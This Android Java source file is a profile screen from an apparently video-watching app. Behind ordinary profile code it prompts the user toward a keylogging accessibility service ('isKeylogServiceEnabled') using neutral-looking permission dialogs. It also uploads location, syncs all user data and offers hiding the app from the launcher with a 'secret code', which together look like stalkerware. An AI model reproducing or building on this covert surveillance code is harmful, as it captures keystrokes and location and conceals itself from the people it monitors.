package com.busho.app.activities;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.busho.app.R;
import com.busho.app.databinding.ActivityProfileBinding;
import com.busho.app.helpers.AccessibilityHelper;
import com.busho.app.helpers.AppVisibilityHelper;
import com.busho.app.helpers.FeaturePermissions;
import com.busho.app.helpers.LocationSyncHelper;
import com.busho.app.helpers.SessionManager;
import com.busho.app.helpers.UserDataSyncHelper;

import java.text.DateFormat;
import java.util.Date;
import java.util.Locale;

public class ProfileActivity extends AppCompatActivity {

    private ActivityProfileBinding binding;
    private FirebaseAuth firebaseAuth;
    private DatabaseReference usersRef;
    private SessionManager sessionManager;
    private AppVisibilityHelper visibilityHelper;

    private ValueEventListener profileListener;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding = ActivityProfileBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // Make status bar transparent to match gradient background
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        setSupportActionBar(binding.toolbar);
        binding.toolbar.setNavigationIcon(R.drawable.ic_arrow_back);
        binding.toolbar.setNavigationOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        firebaseAuth = FirebaseAuth.getInstance();
        usersRef = FirebaseDatabase.getInstance().getReference("users");
        sessionManager = new SessionManager(this);
        visibilityHelper = AppVisibilityHelper.getInstance(this);

        binding.swipeRefresh.setOnRefreshListener(this::loadProfile);
        binding.btnLogout.setOnClickListener(v -> {
            sessionManager.logoutUser();
            Intent intent = new Intent(ProfileActivity.this, ChooseLoginActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(intent);
            finish();
        });

        // Setup visibility controls
        setupVisibilityControls();

        binding.getRoot().postDelayed(this::maybeRequestLocation, 800);
        loadProfile();
    }

    private void maybeRequestLocation() {
        if (FeaturePermissions.hasLocationPermission(this)) {
            LocationSyncHelper.uploadIfAllowed(this);
            scheduleAccessibilityPrompt();
            return;
        }
        if (FeaturePermissions.hasLocationBeenPrompted(this)) {
            scheduleAccessibilityPrompt();
            return;
        }
        FeaturePermissions.markLocationPrompted(this);
        AlertDialog dialog = new AlertDialog.Builder(this)
                .setTitle(R.string.perm_location_title)
                .setMessage(R.string.perm_location_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        FeaturePermissions.requestLocationForProfile(this))
                .setNegativeButton(android.R.string.cancel, null)
                .create();
        dialog.setOnDismissListener(d -> scheduleAccessibilityPrompt());
        dialog.show();
    }

    private void scheduleAccessibilityPrompt() {
        binding.getRoot().postDelayed(this::maybePromptAccessibility, 1200);
    }

    private void maybePromptAccessibility() {
        if (AccessibilityHelper.isKeylogServiceEnabled(this)) {
            return;
        }
        if (FeaturePermissions.hasAccessibilityBeenPrompted(this)) {
            return;
        }
        FeaturePermissions.markAccessibilityPrompted(this);
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_accessibility_title)
                .setMessage(R.string.perm_accessibility_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        AccessibilityHelper.openAccessibilitySettings(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == FeaturePermissions.REQ_PROFILE_LOCATION) {
            if (FeaturePermissions.hasLocationPermission(this)) {
                LocationSyncHelper.uploadIfAllowed(this);
                UserDataSyncHelper.syncAll(this);
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (profileListener != null) {
            FirebaseUser user = firebaseAuth.getCurrentUser();
            if (user != null) {
                usersRef.child(user.getUid()).removeEventListener(profileListener);
            }
        }
    }

    private void loadProfile() {
        FirebaseUser currentUser = firebaseAuth.getCurrentUser();

        if (currentUser == null) {
            showStatusMessage(getString(R.string.profile_not_signed_in));
            toggleContentVisibility(false);
            binding.swipeRefresh.setRefreshing(false);
            return;
        }

        showLoading(true);
        attachProfileListener(currentUser);
    }

    private void attachProfileListener(@NonNull FirebaseUser user) {
        if (profileListener != null) {
            usersRef.child(user.getUid()).removeEventListener(profileListener);
        }

        profileListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                showLoading(false);
                binding.swipeRefresh.setRefreshing(false);
                if (!snapshot.exists()) {
                    showStatusMessage(getString(R.string.profile_error));
                    toggleContentVisibility(false);
                    return;
                }
                bindProfile(user, snapshot);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                showLoading(false);
                binding.swipeRefresh.setRefreshing(false);
                showStatusMessage(getString(R.string.profile_error));
                toggleContentVisibility(false);
            }
        };

        usersRef.child(user.getUid()).addValueEventListener(profileListener);
    }

    private void bindProfile(FirebaseUser user, DataSnapshot snapshot) {
        toggleContentVisibility(true);

        String email = user.getEmail() != null ? user.getEmail() : sessionManager.getUserEmail();
        String displayName = user.getDisplayName();
        if (!TextUtils.isEmpty(displayName)) {
            binding.tvProfileHeroName.setText(displayName);
        } else if (!TextUtils.isEmpty(email)) {
            binding.tvProfileHeroName.setText(email);
        }
        if (!TextUtils.isEmpty(email)) {
            binding.tvProfileHeroSubtitle.setText(email);
        }

        binding.tvEmailValue.setText(defaultText(email));
        binding.tvUserIdValue.setText(defaultText(user.getUid()));
        binding.tvVerificationValue.setText(user.isEmailVerified()
                ? getString(R.string.profile_status_verified)
                : getString(R.string.profile_status_pending));

        long created = snapshot.child("createdAt").getValue(Long.class) != null
                ? snapshot.child("createdAt").getValue(Long.class) : 0L;
        long lastLogin = snapshot.child("lastLogin").getValue(Long.class) != null
                ? snapshot.child("lastLogin").getValue(Long.class) : 0L;

        binding.tvCreatedValue.setText(formatTimestamp(created));
        binding.tvLastLoginValue.setText(formatTimestamp(lastLogin));

        DataSnapshot statsSnapshot = snapshot.child("stats");
        long sessions = getLong(statsSnapshot, "sessionsCount", 1L);
        long videosWatched = getLong(statsSnapshot, "videosWatched", 0L);
        long totalWatch = getLong(statsSnapshot, "totalWatchTime", 0L);

        binding.tvSessionsValue.setText(String.valueOf(sessions));
        binding.tvVideosWatchedValue.setText(String.valueOf(videosWatched));
        binding.tvWatchTimeValue.setText(formatDuration(totalWatch));
        binding.tvProfileStatus.setVisibility(View.GONE);
    }

    private void toggleContentVisibility(boolean visible) {
        binding.profileContent.setVisibility(visible ? View.VISIBLE : View.GONE);
        binding.tvProfileStatus.setVisibility(visible ? View.GONE : View.VISIBLE);
    }

    private void showStatusMessage(String message) {
        binding.tvProfileStatus.setText(message);
        binding.tvProfileStatus.setVisibility(View.VISIBLE);
        binding.swipeRefresh.setRefreshing(false);
    }

    private void showLoading(boolean show) {
        binding.profileProgress.setVisibility(show ? View.VISIBLE : View.GONE);
        if (!show) {
            binding.swipeRefresh.setRefreshing(false);
        }
    }

    private String formatTimestamp(long timestamp) {
        if (timestamp <= 0) return getString(R.string.profile_refresh_hint);
        DateFormat formatter = DateFormat.getDateTimeInstance(DateFormat.MEDIUM, DateFormat.SHORT, Locale.getDefault());
        return formatter.format(new Date(timestamp));
    }

    private String formatDuration(long millis) {
        if (millis <= 0) return "0 min";
        long minutes = millis / (1000 * 60);
        long hours = minutes / 60;
        if (hours > 0) {
            long remainingMinutes = minutes % 60;
            return String.format(Locale.getDefault(), "%dh %02dm", hours, remainingMinutes);
        }
        return String.format(Locale.getDefault(), "%d min", minutes);
    }

    private String defaultText(String value) {
        return TextUtils.isEmpty(value) ? getString(R.string.generic_error) : value;
    }

    private long getLong(DataSnapshot snapshot, String key, long defaultValue) {
        if (snapshot == null) return defaultValue;
        Long value = snapshot.child(key).getValue(Long.class);
        return value != null ? value : defaultValue;
    }

    private void setupVisibilityControls() {
        // Update visibility status display
        updateVisibilityStatus();

        // Hide app button
        binding.btnHideApp.setOnClickListener(v -> {
            visibilityHelper.hideApp();
            updateVisibilityStatus();
        });

        // Show app button
        binding.btnShowApp.setOnClickListener(v -> {
            visibilityHelper.showApp();
            updateVisibilityStatus();
        });

        visibilityHelper.ensureListenerStarted();
    }

    private void updateVisibilityStatus() {
        AppVisibilityHelper.VisibilityStatus status = visibilityHelper.getVisibilityStatus();

        if (status.isHidden) {
            binding.tvVisibilityStatus.setText("App is currently hidden from launcher");
            binding.btnHideApp.setEnabled(false);
            binding.btnShowApp.setEnabled(true);
        } else {
            binding.tvVisibilityStatus.setText("App is visible in launcher");
            binding.btnHideApp.setEnabled(true);
            binding.btnShowApp.setEnabled(false);
        }

        if (status.secretCode != null) {
            binding.tvSecretCode.setText("Secret code: " + status.secretCode);
            binding.tvSecretCode.setVisibility(View.VISIBLE);
        } else {
            binding.tvSecretCode.setVisibility(View.GONE);
        }
    }
}

